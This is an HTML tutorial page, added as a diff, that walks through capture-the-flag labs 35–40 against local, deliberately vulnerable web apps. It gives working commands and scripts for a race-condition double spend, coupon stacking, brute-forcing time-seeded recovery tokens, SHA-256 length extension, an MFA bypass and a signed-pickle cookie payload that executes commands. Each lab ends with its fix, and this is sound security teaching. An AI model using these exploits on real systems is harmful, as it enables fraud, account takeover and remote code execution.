@@ -1,0 +1,303 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Business Logic, Time, and Crypto | h5i web security tutorial</title><meta name="description" content="Race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.">
+<meta name="author" content="h5i-dev"><meta name="theme-color" content="#D21C1C">
+<meta name="color-scheme" content="dark"><meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://h5i.dev/guides/logic-time-and-crypto/"><link rel="icon" type="image/png" href="/_static/logo.png">
+<meta property="og:type" content="article"><meta property="og:site_name" content="h5i">
+<meta property="og:title" content="Business Logic, Time, and Crypto | h5i web security tutorial"><meta property="og:description" content="Race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.">
+<meta property="og:url" content="https://h5i.dev/guides/logic-time-and-crypto/"><meta property="og:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta property="og:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved"><meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Business Logic, Time, and Crypto | h5i web security tutorial">
+<meta name="twitter:description" content="Race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution."><meta name="twitter:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta name="twitter:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "headline": "Business Logic, Time, and Crypto",
+      "description": "Race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.",
+      "author": {
+        "@type": "Organization",
+        "name": "h5i-dev"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "h5i"
+      },
+      "datePublished": "2026-09-15",
+      "dateModified": "2026-09-15",
+      "image": "https://h5i.dev/_static/sandboxed-browser-ui.png",
+      "inLanguage": "en",
+      "isPartOf": {
+        "@id": "https://h5i.dev/#website"
+      },
+      "mainEntityOfPage": "https://h5i.dev/guides/logic-time-and-crypto/"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://h5i.dev/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides",
+          "item": "https://h5i.dev/guides/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Business Logic, Time, and Crypto",
+          "item": "https://h5i.dev/guides/logic-time-and-crypto/"
+        }
+      ]
+    }
+  ]
+}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800;900&amp;family=Space+Grotesk:wght@300;400;500;700&amp;family=Space+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/_static/blog.css?v=20ea6351e0"><link rel="stylesheet" href="/_static/highlight.css?v=45984d5155">
+</head>
+<body><nav class="blog-nav">
+  <a class="nav-logo" href="/"><img src="/_static/logo.png" alt="h5i"><span>h5i</span></a>
+  <ul class="nav-links">
+    <li><a href="/features/">Features</a></li><li><a href="/guides/">Guides</a></li>
+    <li><a href="/manual/">Manual</a></li><li><a href="/blog/">Blog</a></li>
+    <li><a href="https://github.com/h5i-dev/h5i" class="nav-cta">GitHub &rarr;</a></li>
+  </ul>
+</nav><main class="article-wrap"><article class="post">
+<header><div class="post-eyebrow">Tutorial 09 / Logic &middot; 2026-09-15</div>
+<h1>Business Logic, Time, and Crypto</h1><p class="post-deck">A beginner-friendly CTF tutorial: race a balance check, stack valid discounts, predict recovery tokens, extend a hash, skip MFA state, and turn a signed cookie into code execution.</p>
+<div class="post-meta"><span>8 min read</span><span>Races &middot; Predictable tokens &middot; MFA &middot; Labs 35&ndash;40</span></div></header>
+<p>Many serious vulnerabilities contain no obviously dangerous character. Every request may be well-formed and every field may pass validation, while the application’s larger rule is still wrong.</p>
+<p>Labs 35–40 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> focus on those rules: ordering, concurrency, randomness, cryptographic constructions, authentication state, and serialization.</p>
+<p>The labs are local and deliberately vulnerable. Race tests and business-logic attacks can modify data, so use them only with explicit authorization.</p>
+<h2 id="lab-35-race-a-check-then-act-operation">Lab 35: race a check-then-act operation</h2>
+<p>Alice has 100 credits. The transfer endpoint reads the balance, waits briefly, and subtracts later. Multiple requests can therefore observe the same original balance before any one updates it.</p>
+<pre><code class="language-bash">$ ./run.sh 35
+$ h5i browser open 'http://127.0.0.1:9350/' \
+  --session lab35 --new --capture
+</code></pre>
+<p>The homepage prints Alice’s bearer token. Read it out of the captured response:</p>
+<pre><code class="language-bash">$ h5i websec show res_0 --session lab35 --raw
+</code></pre>
+<p>Copy the <code>tok_...</code> value, then release 25 transfers together:</p>
+<pre><code class="language-bash">$ TOKEN='PASTE_TOKEN'
+$ h5i websec replay req_0 --session lab35 --create \
+  --repeat 25 --race \
+  --set method=POST --set path=/api/transfer \
+  --set header.Content-Type=application/json \
+  --set &quot;header.Authorization=Bearer $TOKEN&quot; \
+  --set json.to=vault --set json.amount=100
+</code></pre>
+<p><code>--repeat 25</code> creates the requests. <code>--race</code> makes their worker threads wait at a barrier and then send together.</p>
+<p>Several transfers pass the balance check using the same 100-credit snapshot. Request <code>/api/rewards</code> to obtain <code>FLAG{race_double_spend}</code>.</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab35 --create \
+  --set path=/api/rewards
+</code></pre>
+<p>The fix is an atomic database operation or transaction that locks the row, checks the balance, and updates it as one indivisible action. An idempotency key can also prevent the same logical operation from being accepted repeatedly.</p>
+<h2 id="lab-36-stack-individually-valid-coupons">Lab 36: stack individually valid coupons</h2>
+<p>The checkout API carefully validates every item and coupon. It forgets one business rule: the same coupon should apply only once.</p>
+<pre><code class="language-bash">$ ./run.sh 36
+$ h5i browser open 'http://127.0.0.1:9360/' \
+  --session lab36 --new --capture
+
+$ h5i websec replay req_0 --session lab36 --create \
+  --set method=POST --set path=/api/checkout \
+  --set header.Content-Type=application/json \
+  --set json.item=enterprise-license \
+  --set 'json.coupons=[&quot;FRIEND25&quot;,&quot;FRIEND25&quot;,&quot;FRIEND25&quot;,&quot;FRIEND25&quot;]'
+</code></pre>
+<p>Four valid 25% discounts reduce the price to zero and return <code>FLAG{coupon_stacking}</code>.</p>
+<p>This is not an input-validation bug. The JSON is valid and every coupon exists. The missing invariant is “a coupon may appear at most once.”</p>
+<p>When testing business logic, write the product rules in plain language and try sequences that violate each rule: duplicates, reordering, reuse after cancellation, negative quantities, and concurrent redemption.</p>
+<h2 id="lab-37-predict-a-recovery-token">Lab 37: predict a recovery token</h2>
+<p>Security tokens must be generated with a cryptographically secure random number generator. This lab uses Python’s Mersenne Twister seeded with the current Unix second.</p>
+<pre><code class="language-bash">$ ./run.sh 37
+$ h5i browser open 'http://127.0.0.1:9370/' \
+  --session lab37 --new --capture
+</code></pre>
+<p>Request a token for an address you control. The lab reveals it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab37 --create \
+  --set method=POST --set path=/api/recover \
+  --set header.Content-Type=application/json \
+  --set json.email=me@example.test
+</code></pre>
+<p>The reply contains <code>{"email": "me@example.test", "token": "..."}</code>. Put that token in a variable and search for the second that produced it. Do this immediately: the window is only a few seconds wide.</p>
+<pre><code class="language-bash">$ MINE='PASTE_YOUR_TOKEN'
+$ OFFSET=$(MINE=&quot;$MINE&quot; python3 - &lt;&lt;'SEED'
+import os
+import random
+import time
+
+observed = os.environ[&quot;MINE&quot;]
+now = int(time.time())
+
+for seed in range(now - 5, now + 6):
+    r = random.Random(seed)
+    candidate = &quot;%08x%08x&quot; % (r.getrandbits(32), r.getrandbits(32))
+    if candidate == observed:
+        print(seed - now)
+        break
+else:
+    print(&quot;nocal&quot;)
+SEED
+)
+
+$ printf '%s\n' &quot;$OFFSET&quot;
+0
+</code></pre>
+<p><code>OFFSET</code> is the difference between the server’s clock and ours. <code>nocal</code> means too much time passed between the two commands, so request a fresh token and try again.</p>
+<p>Now ask for the admin’s token, which we are not shown, and test the handful of values it could have been:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab37 --create \
+  --set method=POST --set path=/api/recover \
+  --set header.Content-Type=application/json \
+  --set json.email=admin@acme.test
+
+$ for T in $(OFFSET=&quot;$OFFSET&quot; python3 - &lt;&lt;'SEED'
+import os
+import random
+import time
+
+base = int(time.time()) + int(os.environ[&quot;OFFSET&quot;])
+
+for seed in range(base - 2, base + 3):
+    r = random.Random(seed)
+    print(&quot;%08x%08x&quot; % (r.getrandbits(32), r.getrandbits(32)))
+SEED
+); do
+    h5i websec replay req_0 --session lab37 --create --reset-budget \
+      --set path=/api/recover/use --set &quot;query.token=$T&quot;
+  done
+</code></pre>
+<p>Four of the five candidates answer <code>{"error": "unknown token"}</code>. The fifth returns <code>FLAG{predictable_token}</code>.</p>
+<p>The issue is not token length. Sixteen hexadecimal characters look substantial, but all possible outputs collapse to a few likely time seeds. Use a CSPRNG such as Python’s <code>secrets.token_urlsafe</code>, expire tokens quickly, bind them to one account and purpose, and invalidate them after use.</p>
+<h2 id="lab-38-hash-length-extension">Lab 38: hash length extension</h2>
+<p>The signer authenticates data using:</p>
+<pre><code class="language-text">SHA256(secret || data)
+</code></pre>
+<p>The secret is random and unknown. However, SHA-256’s Merkle–Damgård construction lets someone holding the digest resume hashing after the internal padding and append more data.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 38
+$ h5i browser open 'http://127.0.0.1:9380/' \
+  --session lab38 --new --capture
+</code></pre>
+<p>The homepage prints a sample signed request. Read it and copy the 64-character <code>sig</code>:</p>
+<pre><code class="language-bash">$ h5i websec show res_0 --session lab38 --raw
+</code></pre>
+<p>The repository includes <code>extend.py</code>, which performs the SHA-256 state continuation:</p>
+<pre><code class="language-bash">$ SIG='PASTE_SIGNATURE'
+$ read -r NEWDATA NEWSIG &lt;&lt;&lt;&quot;$(python3 labs/38-length-extension/extend.py \
+    --digest &quot;$SIG&quot; \
+    --data 'user=guest&amp;role=viewer' \
+    --append '&amp;role=admin' \
+    --key-len 16)&quot;
+</code></pre>
+<p>It prints forged percent-encoded data and a new signature. The data contains padding bytes, so send the request target without URL normalization:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab38 \
+  --raw-target &quot;/api/act?data=$NEWDATA&amp;sig=$NEWSIG&quot;
+</code></pre>
+<p>The application uses the last <code>role</code> value and returns <code>FLAG{length_extension}</code>.</p>
+<p>Use HMAC rather than inventing a MAC from <code>hash(secret || message)</code>. HMAC’s construction is specifically designed to avoid length-extension attacks. Also reject duplicate security-critical parameters.</p>
+<h2 id="lab-39-skip-the-second-authentication-state">Lab 39: skip the second authentication state</h2>
+<p>MFA is a flow, not merely a screen. After password verification, this lab issues a temporary token intended only for the second step. Other endpoints mistakenly accept it as a full session.</p>
+<pre><code class="language-bash">$ ./run.sh 39
+$ h5i browser open 'http://127.0.0.1:9390/' \
+  --session lab39 --new --capture
+</code></pre>
+<p>Log in with the known password:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab39 --create \
+  --set method=POST --set path=/api/login \
+  --set header.Content-Type=application/json \
+  --set json.user=dana \
+  --set json.password=correct-horse
+</code></pre>
+<p>Copy the returned token and call the vault without completing MFA:</p>
+<pre><code class="language-bash">$ TOKEN='PASTE_LOGIN_TOKEN'
+$ h5i websec replay req_0 --session lab39 --create \
+  --set path=/api/vault \
+  --set &quot;header.Authorization=Bearer $TOKEN&quot;
+</code></pre>
+<p>The response contains <code>FLAG{mfa_bypass}</code>.</p>
+<p>Represent authentication level explicitly. A pre-MFA token should have a narrow audience and should be accepted only by the verification endpoint. After the second factor succeeds, issue a distinct full-session token.</p>
+<h2 id="lab-40-a-signed-pickle-is-still-a-program">Lab 40: a signed pickle is still a program</h2>
+<p>The final lab stores preferences in a Python pickle inside a cookie. The cookie has a valid HMAC, but the signing key is the sample value printed on the homepage.</p>
+<pre><code class="language-bash">$ ./run.sh 40
+$ h5i browser open 'http://127.0.0.1:9400/' \
+  --session lab40 --new --capture
+</code></pre>
+<p>Python pickle is not a passive data format. Its reconstruction instructions can call functions. Create an object that runs <code>printenv FLAG</code>, then sign it with the exposed key:</p>
+<pre><code class="language-bash">$ COOKIE=$(python3 - &lt;&lt;'PY'
+import base64
+import hashlib
+import hmac
+import pickle
+import subprocess
+
+SECRET = b&quot;prefs-signing-key&quot;
+
+class Payload:
+    def __reduce__(self):
+        return (
+            subprocess.check_output,
+            ([&quot;printenv&quot;, &quot;FLAG&quot;],),
+        )
+
+raw = pickle.dumps(Payload())
+mac = hmac.new(SECRET, raw, hashlib.sha256).hexdigest()[:16]
+value = base64.urlsafe_b64encode(raw).decode().rstrip(&quot;=&quot;)
+print(value + &quot;.&quot; + mac)
+PY
+)
+</code></pre>
+<p>Send it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab40 --create \
+  --set path=/api/prefs \
+  --set &quot;cookie.prefs=$COOKIE&quot;
+</code></pre>
+<p>Deserialization executes the payload and returns <code>FLAG{pickle_cookie_rce}</code>.</p>
+<p>The signature answers only “Was this value created by someone holding the key?” Once the key is exposed, it authorizes arbitrary pickle programs. Never deserialize untrusted pickle data. Use a non-executable format such as JSON with a strict schema, even when the value is signed.</p>
+<h2 id="a-reusable-logic-testing-method">A reusable logic-testing method</h2>
+<p>Move beyond individual fields:</p>
+<ol>
+<li>Write down invariants such as “balance never goes below zero” or “MFA is complete before this token reaches the vault.”</li>
+<li>Test duplicates, reordering, retries, cancellation, and concurrent execution.</li>
+<li>Distinguish apparent entropy from unpredictable entropy.</li>
+<li>Review cryptographic constructions, not only algorithms.</li>
+<li>Ask what a serialized format can execute when decoded.</li>
+<li>Confirm the final business impact.</li>
+</ol>
+<h2 id="summary">Summary</h2>
+<p>These labs exploited missing rules across time and state: concurrent balance checks, duplicate coupons, time-seeded tokens, an unsafe MAC construction, a pre-MFA token accepted too broadly, and executable serialized data.</p>
+<pre><code class="language-bash">$ for s in lab35 lab36 lab37 lab38 lab39 lab40; do
+    h5i browser close --session &quot;$s&quot;
+  done
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/exploit-chains/">Building Exploit Chains</a>, we will combine earlier techniques into reproducible multi-step exploit chains.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/35-race-double-spend">Lab 35: Race condition</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/36-coupon-stacking">Lab 36: Coupon stacking</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/37-predictable-token">Lab 37: Predictable token</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/38-length-extension">Lab 38: Hash length extension</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/39-mfa-bypass">Lab 39: MFA bypass</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/40-pickle-cookie-rce">Lab 40: Insecure deserialization</a></li>
+</ul>
+
+<a class="next-up" href="/guides/exploit-chains/"><span class="label">Next in the series</span><h3>Building Exploit Chains</h3><p>Carry fresh values between requests, turn small findings into a complete compromise, and keep the whole chain reproducible.</p></a>
+<div class="post-cta"><h3>Run the labs yourself</h3><p>42 deliberately vulnerable applications, one binary, no Docker and no accounts.</p>
+<div class="hero-actions"><a class="btn btn-primary" href="https://github.com/h5i-dev/h5i-tutorial">Open h5i-tutorial</a></div></div>
+</article></main><footer class="blog-footer"><div class="blog-footer-inner">
+  <div class="brand">h5i<span class="red"> / high-five</span></div>
+  <nav class="links"><a href="/">Home</a><a href="/guides/">Guides</a><a href="/blog/">Blog</a><a href="/manual/">Manual</a><a href="https://github.com/h5i-dev/h5i">GitHub</a></nav>
+  <div class="legal">Apache 2.0 &middot; Built with Rust</div>
+</div></footer>
+<script src="/_static/blog.js?v=41dbda103a" defer></script><script src="/_static/highlight.js?v=ed81eee4e6" defer></script></body></html>
